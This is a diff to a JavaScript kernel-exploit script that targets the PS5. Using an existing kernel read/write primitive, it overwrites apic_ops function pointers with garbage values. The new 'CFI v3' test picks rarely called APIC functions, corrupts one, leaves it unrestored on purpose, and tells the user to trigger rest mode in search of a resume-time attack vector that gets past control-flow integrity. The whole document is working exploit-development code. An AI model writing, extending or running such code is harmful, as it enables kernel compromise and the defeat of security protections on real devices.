@@ -690,60 +690,74 @@ async function main(userlandRW, wkOnly = false) {
             await log(`[APIC ${i}] ${name}: ${hex64(ptr)}`, LogLevel.INFO);
         }
 
-        // xapic_mode is at index 2, let's try swapping it with another valid APIC function
-        const xapic_mode_addr = apic_ops_base.add32(0x10);  // offset 0x10 = index 2
-        const original_xapic_mode = apic_funcs[2];
+        ///////////////////////////////////////////////////////////////////////
+        // TEST: Overwrite RARELY-CALLED APIC functions
+        // These should NOT crash immediately because they're not called often
+        ///////////////////////////////////////////////////////////////////////
 
-        // Try swapping with "eoi" (index 7) - it's a simple function that just sends EOI
-        const eoi_func = apic_funcs[7];
+        await log("[CFI v3] ===========================================", LogLevel.INFO);
+        await log("[CFI v3] Testing RARELY-CALLED APIC functions", LogLevel.INFO);
+        await log("[CFI v3] If write survives, we can try suspend/resume attack", LogLevel.INFO);
 
-        await log("[CFI v2] ===========================================", LogLevel.INFO);
-        await log("[CFI v2] xapic_mode (target) = " + hex64(original_xapic_mode), LogLevel.INFO);
-        await log("[CFI v2] eoi (swap source)   = " + hex64(eoi_func), LogLevel.INFO);
+        // Candidates: functions unlikely to be called during normal operation
+        const rare_funcs = [
+            { index: 5, name: "dump", desc: "debugging only" },
+            { index: 6, name: "disable", desc: "APIC shutdown only" },
+            { index: 21, name: "enable_mca_elvt", desc: "machine check, rare" },
+            { index: 25, name: "set_lvt_mask", desc: "LVT config, rare" },
+            { index: 26, name: "set_lvt_mode", desc: "LVT config, rare" },
+            { index: 27, name: "set_lvt_polarity", desc: "LVT config, rare" },
+        ];
 
-        const do_swap_test = confirm(
-            "CFI VALID SWAP TEST\n\n" +
-            "Instead of garbage, we'll write a VALID kernel function.\n\n" +
-            "Target: xapic_mode @ " + hex64(xapic_mode_addr) + "\n" +
-            "Current: " + hex64(original_xapic_mode) + "\n" +
-            "Swap to: " + hex64(eoi_func) + " (eoi function)\n\n" +
-            "If CFI is type-based, this should PASS because both are valid APIC functions.\n\n" +
-            "Proceed?"
+        // Which rare function to test (0-5)
+        const RARE_TEST_INDEX = 0;  // Start with dump (index 5 in apic_ops)
+
+        const target = rare_funcs[RARE_TEST_INDEX];
+        const target_addr = apic_ops_base.add32(target.index * 8);
+        const original_val = apic_funcs[target.index];
+
+        await log(`[CFI v3] Target: ${target.name} (${target.desc})`, LogLevel.INFO);
+        await log(`[CFI v3] Address: ${hex64(target_addr)}`, LogLevel.INFO);
+        await log(`[CFI v3] Current: ${hex64(original_val)}`, LogLevel.INFO);
+
+        const do_rare_test = confirm(
+            `RARE FUNCTION TEST\n\n` +
+            `Target: ${target.name} (apic_ops[${target.index}])\n` +
+            `Reason: ${target.desc}\n` +
+            `Address: ${hex64(target_addr)}\n` +
+            `Current: ${hex64(original_val)}\n\n` +
+            `Will write 0xDEADBEEF41414141\n\n` +
+            `If NO immediate crash, the function isn't called during normal operation.\n` +
+            `Then you can manually trigger REST MODE to test resume attack.\n\n` +
+            `Proceed?`
         );
 
-        if (do_swap_test) {
-            // FIRST: Test writing the SAME value back (should never crash)
-            await log("[CFI v2] TEST 1: Writing SAME value back (sanity check)...", LogLevel.INFO);
-            await krw.write8(xapic_mode_addr, original_xapic_mode);
-            await log("[CFI v2] Same-value write OK!", LogLevel.SUCCESS);
+        if (do_rare_test) {
+            await log(`[CFI v3] Writing garbage to ${target.name}...`, LogLevel.WARN);
+            await krw.write8(target_addr, new int64(0x41414141, 0xDEADBEEF));
 
-            // Small delay to ensure any async crash would happen
-            await new Promise(r => setTimeout(r, 500));
+            const verify = await krw.read8(target_addr);
+            await log(`[CFI v3] Verify: ${hex64(verify)}`, LogLevel.INFO);
 
-            await log("[CFI v2] TEST 2: Now trying swap to eoi...", LogLevel.WARN);
-            await krw.write8(xapic_mode_addr, eoi_func);
+            await log(`[CFI v3] Waiting 2 seconds to confirm no crash...`, LogLevel.INFO);
+            await new Promise(r => setTimeout(r, 2000));
 
-            const verify = await krw.read8(xapic_mode_addr);
-            await log("[CFI v2] Verify: " + hex64(verify), LogLevel.INFO);
+            await log(`[CFI v3] *** STILL ALIVE! ***`, LogLevel.SUCCESS);
+            await log(`[CFI v3] ${target.name} is not called during normal operation!`, LogLevel.SUCCESS);
 
-            if (verify.low === eoi_func.low && verify.hi === eoi_func.hi) {
-                await log("[CFI v2] *** WRITE SUCCEEDED - NO CRASH! ***", LogLevel.SUCCESS);
-                await log("[CFI v2] CFI accepts valid function pointer swaps!", LogLevel.SUCCESS);
+            alert(
+                `SUCCESS - No Crash!\n\n` +
+                `${target.name} is NOT called during normal operation.\n\n` +
+                `NOW: Manually put PS5 in REST MODE.\n` +
+                `If it crashes on RESUME, this function is called during resume.\n\n` +
+                `This could be our attack vector!`
+            );
 
-                // Restore original
-                await krw.write8(xapic_mode_addr, original_xapic_mode);
-                await log("[CFI v2] Restored original value", LogLevel.INFO);
-
-                alert(
-                    "SUCCESS!\n\n" +
-                    "CFI allows swapping to valid APIC functions!\n\n" +
-                    "Next step: Find an APIC function that does something exploitable,\n" +
-                    "or try the suspend/resume timing attack."
-                );
-            }
+            // DON'T restore - let the user test resume
+            // await krw.write8(target_addr, original_val);
         }
 
-        // Skip the old brute force test
+        // Skip old tests
         const CFI_TEST_INDEX = -1;  // disabled
         const cfi_test_candidates = [];  // empty
         for (let i = 0; i < cfi_test_candidates.length; i++) {
